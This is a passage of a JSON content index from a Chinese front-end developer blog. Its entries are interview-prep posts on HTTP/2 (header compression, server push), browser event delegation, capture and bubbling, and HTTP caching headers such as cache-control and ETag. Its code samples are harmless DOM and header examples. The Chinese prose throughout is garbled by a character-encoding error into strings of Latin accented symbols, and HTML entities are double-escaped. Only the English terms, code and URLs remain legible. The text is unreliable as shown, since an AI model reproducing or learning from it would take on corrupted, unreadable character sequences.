IDï¼Œå®¢æˆ¶ç«¯é‚„èƒ½æŒ‡å®šæ•¸æ“šæµçš„å„ªå…ˆç´šï¼Œå„ªå…ˆç´šè¶Šé«˜æœå‹™å™¨ä¹Ÿæœƒè¶Šå¿«åšå‡ºå›æ‡‰ã€‚\næ¨™é ­(Header)è¨Šæ¯å£“ç¸® åœ¨ HTTP/2 ä¹‹å‰å› ç‚ºå®‰å…¨æ€§å•é¡Œï¼Œå¤šæ•¸ä¸æœƒå°æ¨™é ­çš„è¨Šæ¯é€²è¡Œå£“ç¸®ï¼Œä¸»è¦æ˜¯éå»çš„æ¡ç”¨çš„æ¼”ç®—æ³•å¯èƒ½é­å— CRIME æ”»æ“Šã€‚åœ¨ HTTP/2 ä¸­ï¼Œä½¿ç”¨ HPACK ç®—æ³•ä¾†é¿å…æ”»æ“Šï¼Œé€²è€Œèƒ½å£“ç¸®æ¨™é ­ã€‚å› ç‚ºå£“ç¸®æ¨™é ­ï¼Œè®“å‚³è¼¸æ™‚èƒ½å¤§å¹…æ¸›å°‘å‚³è¼¸çš„è¨Šæ¯é‡ï¼Œé€²è€Œæ¸›å°‘é »å¯¬è² æ“”ï¼Œä¹Ÿå¢å¿«å‚³è¼¸é€Ÿåº¦ã€‚å…·é«”ä¸Š HPACK ä½¿ç”¨ä¸€ä»½ç´¢å¼•è¡¨ä¾†å®šç¾©å¸¸ç”¨çš„ http headerï¼Œä¸¦æŠŠ http header å­˜æ”¾åœ¨è¡¨è£¡ï¼Œè«‹æ±‚çš„æ™‚å€™åªéœ€è¦ç™¼é€åœ¨è¡¨è£¡çš„ç´¢å¼•ä½ç½®å³å¯ï¼Œä¸é ˆç”¨å‚³å®Œæ•´çš„æ¨™é ­ã€‚\nä¼ºæœå™¨ä¸»å‹•æ¨é€(Server push) HTTP/2 å…è¨±ä¼ºæœå™¨ç«¯ä¸»å‹•å‘å®¢æˆ¶ç«¯æ¨é€æ•¸æ“šï¼Œé€™èƒ½å”åŠ©æ¸›å°‘å®¢æˆ¶ç«¯çš„è«‹æ±‚æ¬¡æ•¸ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œç€è¦½å™¨åœ¨éå»è¦è«‹æ±‚ index.html èˆ‡ style.css ä¾†æ¸²æŸ“å®Œæ•´çš„ç•«é¢ï¼›é€é Server Pushï¼Œå¯ä»¥åœ¨ç€è¦½å™¨è«‹æ±‚ index.html æ™‚ï¼Œä¹Ÿç”±ä¼ºæœå™¨ä¸»å‹•ç™¼é€ style.css ï¼Œé€™æ¨£åªéœ€è¦ä¸€è¼ª HTTP çš„è«‹æ±‚ï¼Œå°±å¯ä»¥æ‹¿åˆ°æ‰€éœ€çš„æ‰€æœ‰è³‡æºã€‚\n","date":"2022-12-19T00:10:00Z","image":"https://live.staticflickr.com/65535/52571909202_4ddc6d0335_o.jpg","permalink":"https://wayneblog.ga/2022-12-19/browser-http1.0-http1.1-http2.0-difference/","title":"é¢è©¦å¸¸è¦‹çš„ç€è¦½å™¨å•é¡Œ(ä¸‰) - HTTP/1ã€HTTP/1.1 å’Œ HTTP/2 çš„å€åˆ¥"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nç•¶ä½¿ç”¨è€…èˆ‡ç€è¦½å™¨äº’å‹•æ™‚ï¼Œæœƒè§¸ç™¼å„é¡ä¸åŒçš„äº‹ä»¶(event)ï¼Œä¾‹å¦‚å¸¸è¦‹çš„é»æ“Š(click)ã€æ»‘å‹•(scroll)ã€‚æˆ‘å€‘å¯ä»¥é€é JavaScript çš„äº‹ä»¶è™•ç†å™¨(handler)ï¼Œä¾†è™•ç†é€™äº›äº‹ä»¶ã€‚è®“æˆ‘å€‘èƒ½åœ¨äº‹ä»¶è§¸ç™¼æ™‚ï¼Œåšå‡ºæˆ‘å€‘è¦çš„æ•ˆæœï¼Œä¾‹å¦‚é»æ“ŠæŸå€‹æŒ‰éˆ•ï¼Œè§¸ç™¼æŸå€‹é‚è¼¯ã€‚\né‡å°ç€è¦½å™¨äº‹ä»¶ï¼Œæœ€å¸¸è¦‹çš„è€ƒé¡Œä¹‹ä¸€ï¼Œä¾¿æ˜¯äº‹ä»¶å§”æ´¾ã€äº‹ä»¶æ•ç²ã€äº‹ä»¶å†’æ³¡ï¼Œæ˜¯å¾ˆå¸¸è¦‹çš„é¢è©¦è€ƒé¡Œã€‚ä»¥ä¸‹å°‡ç”¨ç¬¬ä¸€äººç¨±çš„æ“¬ç­”ï¼Œä¾†å›ç­”ã€Œè«‹èªªæ˜ç€è¦½å™¨ä¸­çš„äº‹ä»¶å§”æ´¾ã€æ•ç²ã€å†’æ³¡ã€é€™å€‹å•é¡Œã€‚\näº‹ä»¶å§”æ´¾ äº‹ä»¶å§”æ´¾æ˜¯ç•¶æˆ‘å€‘æƒ³è¦åœ¨ä¸€ç¾¤å­å…ƒç´ ä¸­ï¼Œéƒ½åŠ ä¸ŠåŒæ¨£çš„äº‹ä»¶ç›£è½å™¨èˆ‡è™•ç†å™¨æ™‚å¯ä»¥æ´¾ä¸Šç”¨å ´ã€‚ç•¶æˆ‘å€‘æœ‰è¨±å¤šç›¸åŒå…ƒç´ ï¼Œæœ‰ç›¸ä¼¼çš„è¡Œç‚ºæ™‚ï¼Œæˆ‘å€‘å¯ä»¥ä¸ç”¨åœ¨æ¯å€‹å…ƒä»¶éƒ½åŠ ä¸Šè™•ç†å™¨ï¼Œè€Œæ˜¯å¯ä»¥ç›´æ¥åœ¨çˆ¶å±¤åŠ ä¸Šè™•ç†å™¨ã€‚é€™æ™‚é€é event.target ä¾†å¾—çŸ¥å¯¦éš›ä¸Šæ˜¯å“ªä¸€å€‹å…ƒç´ ç™¼ç”Ÿäº‹ä»¶ï¼Œä¸¦è™•ç†è©²äº‹ä»¶ã€‚\né€™ç¨®æŠŠç›£è½å™¨èˆ‡è™•ç†å™¨è£åœ¨çˆ¶å±¤ï¼Œç„¶å¾Œå§”æ´¾çµ¦å­å…ƒç´ ï¼Œå°±æ˜¯æ‰€è¬‚çš„äº‹ä»¶å§”æ´¾ã€‚\né€™éº¼åšçš„å¥½è™•æ˜¯ï¼Œæˆ‘å€‘ä¸ç”¨åœ¨æ¯å€‹å…ƒä»¶ï¼Œä¾‹å¦‚æ¯å€‹æŒ‰éˆ•ä¸Šéƒ½åŠ ä¸Šè™•ç†å™¨ï¼Œé€™å¯ä»¥æ¸›å°‘è¨˜æ†¶é«”æ¶ˆè€—ï¼›é€™ä¹Ÿè®“æˆ‘å€‘çš„æ¶æ§‹æ›´å½ˆæ€§ï¼Œå¯ä»¥éš¨æ™‚æ–°å¢æˆ–ç§»é™¤å…ƒç´ ã€‚ä¹Ÿå¯ä»¥å¯«æ¯”è¼ƒå°‘çš„ç¨‹å¼ç¢¼ï¼Œè®“å¯é–±è®€æ€§æå‡ã€‚\nèˆ‰ä¾‹ä¾†èªª (ç·¨æŒ‰ï¼šæ­¤ä¾‹å­ä¾†è‡ª MDN)ï¼Œå¦‚æœæƒ³è¦åœ¨ä¸€é•·ä¸²åˆ—è¡¨ä¸­çš„æ¯å€‹é …ç›®ï¼Œéƒ½åŠ ä¸Šè™•ç†å™¨ï¼Œæˆ‘å€‘å¯ä»¥ç›´æ¥åŠ åœ¨çˆ¶å±¤ï¼Œä¸ç”¨æ¯å€‹å­å…ƒç´ éƒ½åŠ ä¸Šï¼Œå°±ç®—ä»Šå¤©æœ‰ä¸Šç™¾ä¸Šåƒå€‹å­å…ƒä»¶éƒ½æ˜¯ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;div id=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;; 1 2 const container = document.querySelector(\u0026#39;#container\u0026#39;); container.addEventListener(\u0026#39;click\u0026#39;, (event) =\u0026gt; (event.target.style.backgroundColor = bgChange())); äº‹ä»¶æ•ç² äº‹ä»¶å§”æ´¾ä¹‹æ‰€ä»¥èƒ½å¤ ç™¼ç”Ÿï¼Œæ˜¯å› ç‚ºåœ¨èƒŒå¾Œçš„äº‹ä»¶æ•ç²èˆ‡å†’æ³¡æ©Ÿåˆ¶ã€‚ä¸€èˆ¬ä¾†èªªï¼Œç•¶äº‹ä»¶è§¸ç™¼æ™‚ï¼Œæœƒå…ˆé€²å…¥æ•ç²éšæ®µï¼Œç„¶å¾Œåˆ°é”äº‹ä»¶ç›®æ¨™ï¼Œæ¥è‘—æ‰æ˜¯å†’æ³¡éšæ®µã€‚(å»ºè­°åœ¨é¢è©¦æ™‚ï¼Œå¯ä»¥ç°¡å–®æ‰‹ç¹ªé€™å¼µ W3C çš„äº‹ä»¶æµç¨‹ï¼Œæœƒæ›´åŠ å¹«åŠ©èªªæ˜å”·ï¼)\nå¾ä¸Šåœ–å¯å¾—çŸ¥ï¼Œæ‰€è¬‚çš„æ•ç²éšæ®µæ˜¯æŒ‡ï¼šç•¶æŸå€‹äº‹ä»¶è§¸ç™¼æ™‚ï¼Œä¾‹å¦‚ä½¿ç”¨è€…é»äº†æŸå€‹æŒ‰éˆ•ï¼Œæ­¤æ™‚ç”± DOM æ¨¹çš„æœ€ä¸Šå±¤ Window ä¸€è·¯å¾€ä¸‹ï¼Œå°‡äº‹ä»¶å‚³éä¸‹å»ä¸¦åŸ·è¡Œã€‚å¯¦éš›åœ¨ç¨‹å¼ç¢¼ä¸Šï¼Œéœ€è¦åœ¨äº‹ä»¶ç›£è½å™¨ä¸­ï¼ŒåŠ å…¥ {capture: true} ä¾†é–‹å•Ÿæ•ç²æ©Ÿåˆ¶ã€‚\näº‹ä»¶å†’æ³¡ å†’æ³¡éšæ®µå‰‡æ˜¯æ¯”è¼ƒå¸¸ç”¨çš„ï¼Œè·Ÿæ•ç²éšæ®µç›¸åï¼Œå®ƒæ˜¯å…ˆåœ¨ç›®æ¨™ä¸ŠåŸ·è¡Œäº‹ä»¶è™•ç†å™¨ï¼Œæ¥è‘—å‚³éåˆ°çˆ¶å±¤ï¼Œå†å‚³åˆ°ç¥–çˆ¶å±¤ï¼Œç„¶å¾Œä¸€è·¯å‚³ä¸Šå»ã€‚\n1 2 3 4 5 6 7 \u0026lt;form onclick=\u0026#34;alert(\u0026#39;form é»æ“Šäº‹ä»¶è§¸ç™¼\u0026#39;)\u0026#34;\u0026gt; é€™æ˜¯ä¸€å€‹ form å…ƒç´  \u0026lt;div onclick=\u0026#34;alert(\u0026#39;div é»æ“Šäº‹ä»¶è§¸ç™¼\u0026#39;)\u0026#34;\u0026gt; é€™æ˜¯ä¸€å€‹ div å…ƒç´  \u0026lt;p onclick=\u0026#34;alert(\u0026#39;p é»æ“Šäº‹ä»¶è§¸ç™¼\u0026#39;)\u0026#34;\u0026gt;é€™æ˜¯ä¸€å€‹ p å…ƒç´ \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; ä»¥ä¸Šé¢çš„ä¾‹å­ä¾†èªª(å»ºè­°åœ¨é¢è©¦æ™‚ä¹Ÿå¯ä»¥ç°¡å–®å¿«é€Ÿæ‰‹å¯«é€™å€‹ä¾‹å­ï¼Œå¯ä»¥å¹«åŠ©èªªæ˜)ï¼Œç•¶æˆ‘å€‘åœ¨å­å±¤ \u0026lt;p\u0026gt; è£ä¸€å€‹ onclick çš„è™•ç†å™¨ï¼Œé»ä¸‹å»æ™‚ï¼Œä¸åƒ…è©²å…ƒç´ æœ‰è·‘å‡º alert ï¼Œå…¶çˆ¶å±¤ \u0026lt;div\u0026gt; çš„ onclick ä¹Ÿè¢«è§¸ç™¼ï¼Œç„¶å¾Œç¥–çˆ¶å±¤ \u0026lt;form\u0026gt; çš„ onclick ä¹Ÿæ¥çºŒè¢«è§¸ç™¼ã€‚\né€™é‚Šæœ‰å€‹ç´°ç¯€éœ€è¦åˆ†åˆ¥ï¼Œåœ¨å†’æ³¡æ™‚çš„ this ä¸å¿…ç„¶ç­‰æ–¼ event.targetï¼Œè€Œæ˜¯æœƒç­‰æ–¼ event.currentTargetã€‚æ›å¥è©±èªªï¼Œthis æ˜¯æ­£åœ¨åŸ·è¡Œçš„è™•ç†å™¨ (æœƒä¸€ç›´è®Šæˆä¸‹ä¸€å€‹)ï¼›è€Œ event.target ä¸€ç›´éƒ½æœƒæ˜¯çœŸæ­£è®Šé»æ“Šçš„é‚£å€‹(åœ¨é€™é‚Šå°±æ˜¯æœ€è£¡é ­çš„å­å±¤)ã€‚\nåœ¨å¯¦å‹™ä¸Šï¼Œæˆ‘å€‘æœ‰æ™‚å€™ä¸æƒ³è¦å†’æ³¡ï¼Œä¾‹å¦‚åªæƒ³è¦å­å…ƒç´ çš„äº‹ä»¶è¢«è§¸ç™¼ï¼Œä¸æƒ³è¦çˆ¶å±¤çš„å…ƒç´ è¢«è§¸ç™¼ï¼Œé¿å…å¹²æ“¾ã€‚é€™æ™‚å€™æƒ³è¦ä¸ç™¼ç”Ÿå†’æ³¡ï¼Œå¯ä»¥åœ¨è™•ç†å™¨åŠ ä¸Š event.stopPropagation()(ä¸éé€™å€‹ä»æœƒè®“è©²è™•ç†å™¨åŸ·è¡Œï¼Œåªæ˜¯ä¸æœƒå†’æ³¡ä¸Šå»)ï¼›å¦‚æœé€£è©²è™•ç†å™¨çš„å…¶ä»–äº‹ä»¶é¡åˆ¥éƒ½ä¸æƒ³åŸ·è¡Œçš„è©±ï¼Œå¯ä»¥ç”¨ event.stopImmediatePropagation()ã€‚\n","date":"2022-12-19T00:05:00Z","image":"https://live.staticflickr.com/65535/52571751437_6018c4804c_o.jpg","permalink":"https://wayneblog.ga/2022-12-19/browser-delegation-capture-bubble/","title":"é¢è©¦å¸¸è¦‹çš„ç€è¦½å™¨å•é¡Œ(äºŒ) - äº‹ä»¶å§”æ´¾ã€æ•ç²ã€å†’æ³¡"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nå¦‚æœè¦åŠ å¿«ç¶²é æ‡‰ç”¨ç¨‹å¼çš„é€Ÿåº¦ï¼Œcaching æ˜¯å€‹ç¶“å¸¸è¢«ç”¨çš„ç­–ç•¥ (caching ä¸­æ–‡æœ‰è¢«ç¿»è­¯æˆç·©å­˜æˆ–å¿«å–ï¼Œä½†å› ç‚ºå·¥ä½œèˆ‡é¢è©¦æ™‚éƒ½é‚„æ˜¯æœƒèªª caching å±…å¤šï¼Œé€™ç¯‡å°±æš«ä¸ç¿»è­¯é€™å€‹è©äº†)ã€‚ç•¶æˆ‘å€‘å·²ç¶“è·Ÿå¾Œç«¯è«‹æ±‚éæŸå€‹è³‡æºï¼Œä¾‹å¦‚æŸç­†è³‡æ–™æˆ–æŸå¼µåœ–ç‰‡ï¼Œä¸‹ä¸€æ¬¡å†æ¬¡è«‹æ±‚æ™‚ï¼Œå¦‚æœè©²è³‡æºæ²’æœ‰æ”¹è®Šï¼Œé€™æ™‚å†æ¬¡è«‹æ±‚æœƒç›¸å°æµªè²»ç¶²è·¯é »å¯¬ï¼›åä¹‹ï¼Œå¦‚æœç¬¬ä¸€æ¬¡è«‹æ±‚ä¾†çš„è³‡æºå·²ç¶“è¢«å­˜ä¸‹ä¾†ï¼Œé‚£éº¼ä¸‹æ¬¡è«‹æ±‚æ™‚ï¼Œå¯ä»¥ç›´æ¥ç”¨è©²è³‡æºï¼Œé€™æ¨£å¯ä»¥æ¸›å°‘ä¸å¿…è¦çš„è«‹æ±‚ã€‚è€Œé€™ä¹Ÿæ˜¯ caching çš„æ¦‚å¿µã€‚\ncaching å¯ä»¥è¢«æ‡‰ç”¨åœ¨å¾ˆå¤šåœ°æ–¹ï¼ŒAWS çš„é€™ç¯‡æ–‡ç« ä¸­æœ‰æ¦‚ç•¥åˆ†æåˆ°ï¼Œåœ¨å®¢æˆ¶ç«¯ã€DNSã€ä¼ºæœå™¨ã€è³‡æ–™åº«ç­‰åœ°æ–¹éƒ½å¯ä»¥åš cachingã€‚è€Œèº«ç‚ºå‰å¾Œç«¯å·¥ç¨‹å¸«ï¼Œåœ¨é¢è©¦ä¸­å¾ˆå¸¸è¢«å•åˆ°çš„æ˜¯ HTTP çš„ caching æ©Ÿåˆ¶ã€‚é€éæœ¬ç¯‡æ–‡ç« ï¼Œå¸Œæœ›è®“å¤§å®¶ä¸‹æ¬¡é¢è©¦æ™‚è¢«å•åˆ°ã€Œè«‹èªªæ˜ HTTP caching æ©Ÿåˆ¶ã€æ™‚ï¼Œå¯ä»¥è§£é‡‹åœ°å¤ æ¸…æ¥šèˆ‡å®Œæ•´ã€‚\nHTTP caching æ˜¯ç”¨åœ¨å“ªï¼Ÿ ç‚ºä»€éº¼è¦ç”¨ HTTP cachingï¼Ÿ å¯ä»¥æŠŠ cache ç†è§£æˆæŸå€‹æˆ‘å€‘æš«æ™‚å­˜æ”¾è³‡æº(ä¾‹å¦‚æŸç­†è³‡æ–™ã€æŸå¼µåœ–ç‰‡)çš„åœ°æ–¹ï¼Œæ‰€ä»¥ç•¶ä¸‹æ¬¡éœ€è¦é€™äº›è³‡æºæ™‚ï¼Œä¸ç”¨å†è«‹æ±‚ä¸€æ¬¡ï¼Œè€Œæ˜¯å¯ä»¥ç›´æ¥å¾ cache é€™å€‹æš«å­˜è™•æ‹¿åˆ°ã€‚æ›åˆ° HTTP caching çš„è„ˆçµ¡ï¼Œé€™å€‹æš«å­˜çš„åœ°æ–¹å°±æ˜¯ç€è¦½å™¨ã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œç•¶ä»Šå¤©ä½¿ç”¨è€…é€›äº† LV çš„å®˜ç¶²ï¼Œå®˜ç¶²ä¸­çš„å•†å“åœ–ç‰‡èˆ‡åƒ¹éŒ¢ï¼Œä¸å¤ªæœƒå¿«é€Ÿæ”¹è®Šï¼Œæ›å¥è©±èªªç¾åœ¨é€›è·Ÿä¸€å°æ™‚å¾Œé€›ï¼Œçœ‹åˆ°çš„è³‡è¨Šå¾ˆå¯èƒ½æ˜¯å®Œå…¨ä¸€æ¨£çš„ã€‚\né€™æ™‚ç•¶ç¬¬ä¸€æ¬¡é€›ç¶²ç«™æ™‚ï¼Œå‰ç«¯è·Ÿä¼ºæœå™¨è«‹æ±‚äº†é€™äº›å•†å“åœ–ç‰‡ã€æè¿°èˆ‡åƒ¹éŒ¢ï¼ŒæŠŠä»–å€‘ cache èµ·ä¾† (æ”¾åœ¨ç€è¦½å™¨è¨˜æ†¶é«”çš„æŸå€‹åœ°æ–¹)ï¼Œç•¶ä½¿ç”¨è€…ä¸‹æ¬¡é€›çš„æ™‚å€™ï¼Œå°±ä¸éœ€è¦å†è·Ÿä¼ºæœå™¨è«‹æ±‚äº†ã€‚ä¸‹é¢é€™å¼µæ˜¯ä¾†è‡ª MDN çš„åœ–ç¤ºï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæ²’æœ‰ cacheï¼Œæ¯ä¸€æ¬¡è«‹æ±‚éƒ½è¦å°åˆ°ä¼ºæœå™¨ï¼›ç„¶è€Œå¦‚æœæœ‰ cacheï¼Œå‰‡å¯ä»¥å¾ cache è£¡é¢æ‹¿ï¼Œå¯ä»¥æ¸›å°‘ç›´æ¥å°ä¼ºæœå™¨çš„è«‹æ±‚ï¼š\nè®€åˆ°é€™é‚Šæˆ‘å€‘å¯ä»¥æ­¸ç´å‡ºï¼Œé€™éº¼åšæœ‰å¹¾é … caching å¥½è™•ï¼Œä¹Ÿæ˜¯æˆ‘å€‘ç‚ºä»€éº¼è¦ç”¨ caching çš„ç†ç”±ï¼š\næ¸›å°‘è«‹æ±‚æ¬¡æ•¸ï¼šå› ç‚ºä¸ç”¨è«‹æ±‚ï¼Œè€Œæ˜¯ç›´æ¥å¾ cache æ‹¿å‡ºä¹‹å‰æš«å­˜çš„è³‡æ–™ï¼Œé€™æ¨£åšèƒ½æ¸›å°‘ä¼ºæœå™¨èˆ‡è³‡æ–™åº«ç«¯çš„è² æ“”ã€‚ åŠ å¿«è³‡æºè¼‰å…¥ï¼šå‘ä¼ºæœå™¨è«‹æ±‚ï¼Œéœ€è¦ç­‰ç¶²è·¯å‚³è¼¸è³‡æ–™ã€‚ç›´æ¥å¾ç€è¦½å™¨è£¡é¢çš„ cache æ‹¿ï¼Œå°±ä¸ç”¨ç­‰é€™ä¸€æ®µè³‡æ–™å‚³è¼¸çš„æ™‚é–“ï¼Œæœƒå¿«å¾ˆå¤šã€‚ è©²å¦‚ä½•è¨­å®š HTTP cachingï¼Ÿ ä¸Šé¢è«‡åˆ° HTTP caching çš„å¥½è™•ï¼Œä»¥åŠå¯ä»¥æŠŠè·Ÿä¼ºæœå™¨è«‹æ±‚ä¾†çš„è³‡æ–™ cache åœ¨ç€è¦½å™¨ä¸­ã€‚ä½†å¯¦éš›ä¸Šè©²å¦‚ä½•è¨­å®šå‘¢ï¼Ÿé€™ä¹Ÿæ˜¯é¢è©¦æ™‚æœƒè¢«è¿½å•çš„ã€‚\nä»¥ä¸‹æœ‰å¹¾ç¨®æ–¹å¼ï¼š\nExpires ç¬¬ä¸€ç¨®æ–¹å¼æ˜¯åœ¨ HTTP Response header ç•¶ä¸­åŠ å…¥ Expiresï¼Œèˆ‰ä¾‹ä¾†èªªï¼š\n1 Expires: Tue, 18 Jul 2022 16:07:23 GMT ç€è¦½å™¨æ”¶åˆ°è©²å›æ‡‰çš„è³‡æ–™æœƒå…ˆæŠŠè³‡æ–™å­˜åœ¨ cache ç•¶ä¸­ï¼Œè€Œä¸‹ä¸€æ¬¡ç”¨æˆ¶ç™¼é€ç›¸åŒè«‹æ±‚æ™‚ï¼Œç€è¦½å™¨æœƒå»åˆ¤æ–·ç¾åœ¨æ™‚é–“æ˜¯å¦å·²ç¶“åˆ°äº† Expires è¨­å®šçš„æ™‚é–“ï¼Œå¦‚æœé‚„æ²’åˆ°ï¼Œé‚£å°±æœƒç›´æ¥å¾ cache è£¡é¢æ‹¿è³‡æ–™ï¼Œè€Œä¸æ˜¯ç™¼é€è«‹æ±‚ã€‚\ncache-control ç”±æ–¼ Expires æ˜¯æ¯”è¼ƒèˆŠçš„æ–¹æ³•ï¼Œç¾åœ¨æ¯”è¼ƒå°‘äººæœƒç”¨ï¼Œæ›´å¤šäººæœƒç”¨ cache-controlã€‚cache-control çš„è¨­å®šæ–¹å¼ä¸æ˜¯ç›´æ¥è¨­å®šä¸€å€‹ cache éæœŸçš„æ™‚é–“é»ï¼Œè€Œæ˜¯è¨­å®š cache æœ‰æ•ˆçš„æ™‚é–“ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œä¸‹é¢é€™æ®µæ˜¯è¨­å®š cache æœ‰æ•ˆæœŸæ˜¯ 60 ç§’ã€‚æ‰€ä»¥åœ¨ç¬¬ä¸€æ¬¡è«‹æ±‚æ‹¿åˆ°å›æ‡‰å¾Œçš„å…­åç§’å…§ï¼Œå¦‚æœåœ¨ç™¼é€ç›¸åŒè«‹æ±‚ï¼Œç€è¦½å™¨éƒ½æœƒç›´æ¥æ‹¿ cache çš„è³‡æ–™ï¼Œè€Œä¸æ˜¯ç™¼è«‹æ±‚åˆ°ä¼ºæœå™¨ç«¯ï¼š\n1 cache-control: max-age=60 cache-control å¿«å•å¿«ç­” é—œæ–¼ cache-control çš„è¨­å®šï¼Œæœ‰ä¸€äº›é¢è©¦å¸¸æœƒè¢«å•çš„å¿«å•å¿«ç­”ï¼Œä»¥ä¸‹åˆ—å‡ºé¡Œç›®ã€‚ä¸‹é¢æœƒæœ‰ç­”æ¡ˆï¼Œä¸éå¤§å®¶å¯ä»¥å…ˆè‡ªå·±æƒ³æƒ³çœ‹ï¼Œçœ‹çœ‹è‡ªå·±çŸ¥ä¸çŸ¥é“é€™äº›å•é¡Œçš„å›ç­”ã€‚\nå¦‚æœåªæƒ³è®“å®¢æˆ¶ç«¯ cachedï¼Œè€Œä¸æƒ³è®“ä¸­é–“å±¤çš„ä»£ç†ä¼ºæœå™¨ç­‰å…¶ä»–å±¤ cachedï¼Œè©²ç”¨ä»€éº¼ï¼Ÿ åä¹‹ï¼Œå¦‚æœæƒ³è®“ä»£ç†ä¼ºæœå™¨ä¹Ÿèƒ½å¤  cached å¾å¾Œç«¯ä¾†çš„è³‡æ–™ï¼Œè©²ç”¨ä»€éº¼ï¼Ÿ å› ç‚ºå¾ˆå¤šæ™‚å€™ç€è¦½å™¨å¯èƒ½æœƒè‡ªå‹• cacheï¼Œå¦‚æœå®Œå…¨ä¸æƒ³è¦æœ‰ cacheï¼Œæƒ³è¦å…§å®¹ä¸€ç›´éƒ½æ˜¯æœ€æ–°çš„ï¼Œé‚£åˆè©²ç”¨ä»€éº¼ cache-control: no-store è·Ÿ cache-control: no-cache å…©è€…æœ‰ä»€éº¼å·®åˆ¥ï¼Ÿ ä¸Šé¢çš„å•é¡Œçš„å›ç­”åˆ†åˆ¥æ˜¯ï¼š\ncache-control: private cache-control: public cache-control: no-store cache-control: no-store æ˜¯æŒ‡ä¸è¦ cacheï¼Œè€Œ cache-control: no-cache å‰‡æ˜¯æŒ‡æœƒ cacheï¼Œä¸éæ¯ä¸€æ¬¡è«‹æ±‚æ™‚éƒ½è¦é‡æ–°é©—è­‰ä¸€æ¬¡ (revalidate)ï¼Œæ›å¥è©±èªªæ¯æ¬¡éƒ½é‚„æ˜¯æœƒå•ä¼ºæœå™¨å…§å®¹æœ‰æ²’æœ‰æ›´æ–°ï¼Œæ²’æ›´æ–°å°±ç”¨ cache çš„ã€‚è©³è¦‹é€™ç¯‡è¨è«–ã€‚\nHTTP caching éæœŸå¾Œï¼Œè©²å¦‚ä½•é‡æ–°é©—è­‰ï¼Ÿ ä¸Šé¢æåˆ°æˆ‘å€‘å¯ä»¥é€é cache-control: max-age ä¾†è¨­å®šå¤šä¹…å¾Œ cache éæœŸï¼›ä¸éç•¶ cache éæœŸå¾Œå°±è¦ç›´æ¥è·Ÿä¼ºæœå™¨è«‹æ±‚å—ï¼Ÿ\nå¦‚æœ cache éæœŸäº†ï¼Œä½†å…¶å¯¦ä¼ºæœå™¨é‚£é‚Šçš„è³‡æ–™ä¸¦æ²’æœ‰æ›´æ–°ï¼Œæ›å¥è©±èªª cache é‚„æ˜¯å¯ä»¥ç¹¼çºŒè¢«ä½¿ç”¨ï¼Œé€™æ™‚æœ‰æ²’æœ‰ä»€éº¼æ–¹æ³•å¯ä»¥é¿å…æˆ‘å€‘ç›´æ¥é‡æ–°è«‹æ±‚ï¼Œç¹¼çºŒä½¿ç”¨ cacheï¼Ÿ\næœ‰çš„ï¼Œé€™åˆè¢«ç¨±ç‚ºé©—è­‰ (validation)ï¼Œè€Œ HTTP caching æœ‰å…©ç¨®ä¸»è¦æ–¹å¼å¯ä»¥åšåˆ°é€™ä»¶äº‹ã€‚\nETag (æ­é… If-None-Match) ç¬¬ä¸€å€‹æ–¹å¼æ˜¯åœ¨å›æ‡‰çš„ header ç•¶ä¸­æ”¾å…¥ ETag (entity tag çš„ç°¡å¯«)ã€‚é€™å€‹ ETag æœƒæ˜¯ä¸€å€‹ç¨ç‰¹çš„å€¼ï¼Œä¾‹å¦‚ ETag: \u0026ldquo;686897696a7c876b7e\u0026rdquo;ï¼›å¦‚æœå¾Œç«¯çš„è³‡æ–™æœ‰è®Šå‹•ï¼Œå‰‡ ETag æœƒæ”¹è®Šã€‚å¦‚æœä¼ºæœå™¨åœ¨å›å‚³çš„ header ä¸­æœ‰æ”¾å…¥ ETagï¼Œ å‰‡ä¹‹å¾Œç€è¦½å™¨åœ¨è«‹æ±‚æ™‚ï¼Œæœƒåœ¨è«‹æ±‚çš„ header å¸¶ä¸Š If-None-Match æ¬„ä½ï¼Œè€Œæ¬„ä½çš„å€¼æœƒæ˜¯ä¹‹å‰æ”¶åˆ°çš„ ETag çš„ç¨ç‰¹å€¼ã€‚\né€™æ™‚å¾Œç«¯æ”¶åˆ°äº†è©²è«‹æ±‚ï¼Œä¸¦å»æŸ¥çœ‹ If-None_match ç•¶ä¸­çš„ ETag è·Ÿç¾åœ¨çš„ ETag æ˜¯ä¸æ˜¯ä¸€æ¨£çš„ã€‚å¦‚æœæ˜¯ä¸€æ¨£çš„ï¼Œå°±ä»£è¡¨å¾Œç«¯çš„è³‡æ–™æ²’è®Š(å› 